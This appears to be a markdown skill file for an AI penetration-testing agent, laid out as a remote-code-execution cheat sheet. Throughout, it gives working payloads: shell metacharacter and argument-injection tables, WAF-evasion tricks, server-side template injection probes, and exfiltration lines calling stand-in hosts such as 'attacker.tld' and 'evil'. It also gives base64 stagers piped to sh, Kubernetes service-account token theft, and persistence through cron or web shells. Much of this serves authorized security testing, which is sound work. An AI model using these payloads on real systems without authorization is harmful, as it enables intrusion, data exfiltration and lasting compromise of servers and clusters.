---
name: rce
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
depends_on: []
---

# RCE

Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|--------|---------------|----------------|
| File conversion endpoints | PDF/image/doc converters, export-as-X | Shell out to wkhtmltopdf, ImageMagick, LibreOffice, Ghostscript |
| Report/invoice generation | `/api/report`, `/export`, `/generate` | Template engines + shell-based renderers (WeasyPrint, Puppeteer) |
| CI/CD webhook handlers | `/hooks/build`, `/api/pipeline`, `.gitlab-ci.yml` | User-controlled branch names, commit messages, env vars hit shell |
| Git operations | Clone URL, submodule config, custom hooks | `--upload-pack`, `ext::` protocol, hook scripts execute on clone |
| Package manager interfaces | npm/pip/gem install from user input, lock files | Pre/post-install scripts, dependency confusion, shell wrappers |
| Backup/restore features | Admin panels, database dump/restore | Filename or path passed to `tar`, `pg_dump`, `mysqldump` unsanitized |
| Health/diagnostic endpoints | `/ping`, `/traceroute`, `/nslookup`, `/dig` | Direct shell execution of user-supplied host/IP arguments |
| Email sending with user headers | Contact forms, SMTP config, newsletter | sendmail flags (-O, -X, -C) injectable via headers |
| DNS/network lookup tools | WHOIS, reverse DNS, port scanners | Input flows to `dig`, `host`, `nmap` via shell |
| Import/export with shell processing | CSV/XML import, data migration tools | Filename metacharacters or content passed to shell pipelines |
| Log rotation/archival features | Admin log management, compress/archive | Filenames reach `gzip`, `tar`, `logrotate` unsanitized |
| Image/media processing | Resize, thumbnail, watermark, transcode | ImageMagick delegates, ffmpeg concat, ExifTool metadata parsing |

## Attack Surface

**Command Execution**
- OS command execution via wrappers (shells, system utilities, CLIs)

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm

**Deserialization**
- Insecure deserialization and gadget chains across languages

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives (FastCGI, Redis)

**Container Escalation**
- App RCE to node/cluster compromise via Docker/Kubernetes

## Shell Metacharacter Matrix

| Char | Bash/sh/zsh | cmd.exe | PowerShell | Effect |
|------|-------------|---------|------------|--------|
| `;` | Yes | No | Yes | Command separator |
| `\|` | Yes | Yes | Yes | Pipe stdout to next command |
| `\|\|` | Yes | Yes | Yes | Execute next if first fails |
| `&` | Yes (bg) | Yes (sep) | No | Background (Unix) / separator (Windows) |
| `&&` | Yes | Yes | No | Execute next if first succeeds |
| `` ` `` | Yes (subst) | No | Yes (escape) | Command substitution (Unix) / escape (PS) |
| `$()` | Yes | No | Yes | Command substitution |
| `${}` | Yes | No | Yes | Variable expansion / substitution |
| `>` / `>>` | Yes | Yes | Yes | Redirect / append stdout |
| `<` | Yes | Yes | Yes | Redirect stdin |
| `\n` / `%0a` | Yes | No | Yes | Newline = command separator |
| `\r` / `%0d` | Partial | No | No | Carriage return (some parsers split) |
| `$IFS` | Yes | No | No | Internal field separator (space bypass) |
| `^` | No | Yes (escape) | No | Escape char in cmd.exe |
| `%VAR%` | No | Yes | No | Environment variable expansion |
| `!VAR!` | No | Yes (delayed) | No | Delayed expansion in cmd.exe |
| `$(...)` | No | No | Yes | PowerShell subexpression |

## Argument Injection Patterns

| Target | Dangerous Flag/Technique | Payload Example | Impact |
|--------|--------------------------|-----------------|--------|
| curl | `--output`, `-O` | `--output /var/www/html/shell.php` | Arbitrary file write to webroot |
| wget | `-O` | `-O /tmp/shell http://evil/shell` | Download + write arbitrary file |
| git | `--upload-pack` | `--upload-pack='touch /tmp/pwned'` | Arbitrary command via clone |
| git | `ext::` protocol | `ext::sh -c cmd% >&2` | Shell via transport protocol |
| tar | `--checkpoint-action` | `--checkpoint=1 --checkpoint-action=exec=sh\ x.sh` | Command exec during extract |
| zip/unzip | `-T` (test) | `-T -TT 'sh #'` | Shell command via test flag |
| find | `-exec` | `-exec /bin/sh -c 'id' \;` | Arbitrary command execution |
| ffmpeg | concat protocol | `concat:http://evil/header\|file:///etc/passwd` | File read / SSRF |
| ImageMagick | delegates (SVG/MVG) | `push graphic-context; url(\|id)` | Shell via delegate processing |
| ssh | `-o ProxyCommand` | `-o ProxyCommand='touch /tmp/pwned'` | Command exec via proxy |
| rsync | `-e` | `-e 'sh -c id'` | Custom shell command |
| sendmail | `-O`, `-X`, `-C` | `-OQueueDirectory=/tmp -X/var/www/shell.php` | Arbitrary file write |
| nmap | `--script` | `--script=http-put --script-args=...` | Upload via NSE script |
| python | `-c` | `-c 'import os;os.system("id")'` | Direct code execution |
| node | `-e` | `-e 'require("child_process").execSync("id")'` | Direct code execution |
| php | `-r` | `-r 'system("id");'` | Direct code execution |
| perl | `-e` | `-e 'system("id")'` | Direct code execution |
| ruby | `-e` | `-e 'system("id")'` | Direct code execution |

## Blind Command Injection Techniques

| Technique | Method | Detection Signal |
|-----------|--------|-----------------|
| Time-based | `sleep 5`, `ping -c 5 127.0.0.1` | Response delayed by exact N seconds |
| DNS OAST | `nslookup $(whoami).ID.oast.tld` | DNS query with exfiltrated data in subdomain |
| HTTP OAST | `curl https://ID.oast.tld/$(id\|base64)` | HTTP request with encoded output in path |
| File write | `id > /var/www/html/.out.txt` | Fetch the written file via web request |
| Error differential | `; exit 0` vs `; exit 1` | Different HTTP status codes or response lengths |
| DNS timing | `nslookup $(sleep 5).x.tld` | Measurable delay from DNS resolution |

For each blind technique: confirm twice with different delays/tokens to eliminate false positives from network jitter.

## Environment-Specific Escape Techniques

| Environment/Restriction | Bypass |
|------------------------|--------|
| WAF blocks spaces | `${IFS}`, `$IFS`, `{cat,/etc/passwd}`, `X=$'\x20'`, `<` as stdin redirect |
| No semicolons | Newlines `%0a`, `&&`, `||`, `|` |
| No backticks | `$()` command substitution |
| Filtered `cat` | `tac`, `head`, `tail`, `less`, `more`, `nl`, `xxd`, `base64`, `dd`, `rev`, `sort` |
| Filtered keywords (e.g. `whoami`) | `w'h'o'a'm'i`, `w"h"o"a"m"i`, `wh$()oami`, `who$@ami`, `/usr/bin/w?oami` |
| No outbound network | Write to webroot, `/tmp`, or abuse DNS (always allowed) |
| Read-only filesystem | `/tmp`, `/dev/shm`, `/proc/self/fd/`, env vars as data store |
| No common binaries | Shell builtins: `echo`, `printf`, `read`, `type`, `export`, `eval` |
| Alpine/BusyBox | `busybox CMD`, limited tools but `wget` usually present |
| Docker with no shell | `/proc/self/exe` tricks, `nsenter`, binary from mounted volume |
| Char-length limit | Stage via multiple short writes: `echo a>>f; echo b>>f; sh f` |
| No `/` character | `${HOME:0:1}` extracts `/` from `$HOME`, `${PATH%%:*}` |

## Language-Specific Command Injection Sinks

| Language | Dangerous Functions | Safe Alternative |
|----------|-------------------|-----------------|
| Python | `os.system()`, `os.popen()`, `subprocess.call/run/Popen(shell=True)`, `commands.getoutput()` | `subprocess.run([...], shell=False)` with list args |
| Node.js | `child_process.exec()`, `execSync()`, `spawn(cmd,args,{shell:true})` | `spawn(cmd, [args])` without shell flag |
| PHP | `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, `` `cmd` `` | `escapeshellarg()` + `escapeshellcmd()` |
| Ruby | `system()`, `exec()`, `` `cmd` ``, `%x{cmd}`, `IO.popen()`, `Open3` | `system("cmd", "arg1", "arg2")` multi-arg form |
| Java | `Runtime.getRuntime().exec(string)`, `ProcessBuilder` with shell | `ProcessBuilder(List<String>)` without shell wrapper |
| Go | `exec.Command("sh", "-c", userInput)` | `exec.Command("binary", "arg1", "arg2")` directly |
| Perl | `system($cmd)`, `exec($cmd)`, `` `$cmd` ``, `open(FH, "\|$cmd")` | `system("cmd", @args)` list form |
| C# | `Process.Start("cmd", "/c " + input)` | `ProcessStartInfo` with `ArgumentList` collection |

## Detection Channels

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to reduce noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

**DNS**
```bash
nslookup $(whoami).x.attacker.tld
```

**HTTP**
```bash
curl https://attacker.tld/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

## Key Vulnerabilities

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**
- Inject flags/filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
- Break out of quoted segments by alternating quotes and escapes
- Environment expansion: `$PATH`, `${HOME}`, command substitution
- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) vs relying on PATH
- Use builtins or alternative tools (`printf`, `getent`) when `id` is filtered
- Use `sh -c` or `cmd /c` wrappers to reach the shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable building: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

### Template Injection

Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug

**Minimal Probes**
```
Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Deserialization and EL

**Java**
- Gadget chains via CommonsCollections/BeanUtils/Spring
- Tools: ysoserial
- JNDI/LDAP chains (Log4Shell-style) when lookups are reachable

**.NET**
- BinaryFormatter/DataContractSerializer
- APIs accepting untrusted ViewState without MAC

**PHP**
- `unserialize()` and PHAR metadata
- Autoloaded gadget chains in frameworks and plugins

**Python/Ruby**
- pickle, `yaml.load`/`unsafe_load`, Marshal
- Auto-deserialization in message queues/caches

**Expression Languages**
- OGNL/SpEL/MVEL/EL reaching Runtime/ProcessBuilder/exec

### Media and Document Pipelines

**ImageMagick/GraphicsMagick**
- policy.xml may limit delegates; still test legacy vectors
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript in PDFs/PS: `%pipe%id` file operators

**ExifTool**
- Crafted metadata invoking external tools or library bugs

**LaTeX**
- `\write18`/`--shell-escape`, `\input` piping; pandoc filters

**ffmpeg**
- concat/protocol tricks mediated by compile-time flags

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (build FPM records to invoke system/exec)

**Redis**
- `gopher://` write cron/authorized_keys or webroot
- Module load when allowed

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable internally

### Container and Kubernetes

**Docker**
- From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuses: mounted docker.sock, hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`

**Kubernetes**
- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
- Query API for pods/secrets; enumerate RBAC
- Talk to kubelet on 10250/10255; exec into pods
- Escalate via privileged pods, hostPath mounts, or daemonsets

## Bypass Techniques

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to reach alternate parsers

**Binary Alternatives**
- Absolute paths and alternate binaries (busybox, sh, env)
- Windows variations (PowerShell vs CMD)
- Constrained language bypasses

## Post-Exploitation

**Privilege Escalation**
- `sudo -l`; SUID binaries; capabilities (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell behind auth
- Plugin hooks; supply chain in CI/CD

**Lateral Movement**
- SSH keys, cloud metadata credentials, internal service tokens

## Testing Methodology

1. **Identify sinks** - Command wrappers, template rendering, deserialization, file converters, report generators, plugin hooks
2. **Establish oracle** - Timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** - User, working directory, PATH, shell, SELinux/AppArmor, containerization
4. **Map boundaries** - Read/write locations, outbound egress
5. **Progress to control** - File write, scheduled execution, service restart hooks

## Validation

1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
2. Show command context (uid, gid, cwd, env) and controlled output
3. Demonstrate persistence or file write under application constraints
4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across runs and transports

## False Positives

- Only crashes or timeouts without controlled behavior
- Filtered execution of a limited command subset with no attacker-controlled args
- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
- Simulated outputs not derived from executed commands

## Impact

- Remote system control under application user; potential privilege escalation to root
- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
- Cluster compromise when combined with container/Kubernetes misconfigurations

## Pro Tips

1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise
2. When command injection is weak, pivot to file write or deserialization/SSTI paths
3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates
4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads
5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps
6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops
8. Test every file upload/conversion endpoint for injection in filenames—`$(id).pdf`, `` `id`.png ``, `file;id.doc` all reach shell when the name hits a command wrapper unsanitized
9. Argument-inject via email headers: SMTP `From`/`To` with `-O QueueDirectory=/tmp -X /var/www/shell.php` reaches sendmail flags when the mailer invokes sendmail as a process
10. Audit git operations: clone URLs accept `--upload-pack='cmd'`, `ext::sh -c cmd% >&2` protocol, and `.gitmodules` submodule URLs execute on recursive clone—any user-controlled repo URL is a sink
11. CI/CD pipeline injection: branch names, tag names, commit messages, PR titles flow into `$CI_*` vars and `run:` steps—inject `$(curl oast)` in a branch name and watch the pipeline execute it
12. PDF generation libraries (wkhtmltopdf, Puppeteer, headless Chrome) render attacker HTML including `<script>`, `<iframe>`, `file://` access, and SSRF via `<link>`—treat PDF export as SSRF+XSS+LFI combined
13. After confirming container RCE, immediately check: `cat /proc/1/cgroup` (container type), `mount` (host mounts, docker.sock), `capsh --print` (capabilities), `ls -la /var/run/docker.sock` (container escape via API), `env | grep KUBE` (K8s tokens)
14. For cloud services that auto-create infrastructure with deterministic names (GCS buckets, S3 buckets, DNS records), test pre-emption: create the resource before the victim's provisioning completes ($1.3M)
15. E2EE moves sanitization client-side -- audit every client's filename/MIME/content handler harder than the server ($111K)
16. Cross-sandbox shared state in multi-policy platforms: when two sandboxes share a heap, file store, or env vars, callback hooks can bridge them to escape isolation ($133K)
17. `--` prefix argument injection: any feature building CLI commands from user-controlled filenames/refs -- `--output=/var/www/shell.php` or `--checkpoint-action=exec=cmd` ($12K)
18. Inter-subsystem object lifetime auditing: when a new kernel subsystem (io_uring, eBPF, vsock) interacts with an existing object model, audit every cross-subsystem reference for use-after-free -- the new subsystem's lifetime assumptions rarely match the old object's refcount/free path ($11.3M, report 613293056)
19. Deprecated kernel API surfaces from sandboxed contexts: enumerate backward-compat syscalls/ioctls reachable from app sandboxes (seccomp, sandbox profiles) -- deprecated paths get fewer audits but remain callable, making them high-value targets for privilege escalation ($10K, report 826026)
20. Inner-loop pointer arithmetic without bounds re-check: in decoders/parsers, find the outermost loop with a bounds check and then audit inner pointer advances that skip re-validation -- the gap between the outer guard and the inner arithmetic is a reliable OOB read/write shape ($7.5K, report 1180252)
21. Cache/pool shared object UAF: treat any cache or pool of long-lived shared objects in native code as a UAF candidate -- enumerate every entry/exit path, check if any consumer can trigger free while another holds a reference, and fuzz entry/exit ordering ($2K, report 1180380)

## Summary

RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
